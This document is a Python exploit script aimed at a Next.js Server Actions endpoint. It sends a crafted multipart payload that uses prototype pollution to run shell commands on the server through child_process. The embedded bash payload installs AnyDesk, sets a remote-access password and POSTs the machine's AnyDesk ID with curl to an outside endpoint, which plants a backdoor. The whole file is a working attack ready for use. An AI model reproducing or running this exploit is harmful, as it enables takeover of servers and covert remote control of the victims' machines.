# /// script
# dependencies = ["requests"]
# ///
import requests
import sys
import json

BASE_URL = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:3000"
# EXECUTABLE = sys.argv[2] if len(sys.argv) > 2 else "id"
command = """

#!/bin/bash
# Constants
ANYDESK_URL="https://download.anydesk.com/linux/anydesk_6.2.1-1_amd64.deb" # Adjust the version as necessary
ANYDESK_ID_URL="http://example.com/endpoint" # Replace with your target URL
PASSWORD="your_password" # Set your desired password

# Install AnyDesk
echo "Installing AnyDesk..."
wget $ANYDESK_URL -O anydesk.deb
sudo dpkg -i anydesk.deb
sudo apt-get install -f -y # Fix dependencies
rm anydesk.deb

# Set Password
echo "Setting AnyDesk password..."
echo -e "$PASSWORD\n$PASSWORD" | sudo anydesk --set-password "$PASSWORD"

# Retrieve AnyDesk ID
ANYDESK_ID=$(anydesk --get-id)

# Send AnyDesk ID via POST request
echo "Sending AnyDesk ID..."
curl -X POST -d "anydesk_id=$ANYDESK_ID" $ANYDESK_ID_URL

echo "AnyDesk installation and configuration completed!"


"""
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,
    "value": '{"then": "$B0"}',
    "_response": {
        "_prefix": f"var res = process.mainModule.require('child_process').execSync('bash -c {command}',{{'timeout':5000}}).toString().trim(); throw Object.assign(new Error('NEXT_REDIRECT'), {{digest:`${{res}}`}});",
        # If you don't need the command output, you can use this line instead:
        # "_prefix": f"process.mainModule.require('child_process').execSync('{EXECUTABLE}');",
        "_formData": {
            "get": "$1:constructor:constructor",
        },
    },
}

files = {
    "0": (None, json.dumps(crafted_chunk)),
    "1": (None, '"$@0"'),
}

headers = {"Next-Action": "x"}
res = requests.post(BASE_URL, files=files, headers=headers, timeout=10)
print(res.status_code)
print(res.text)
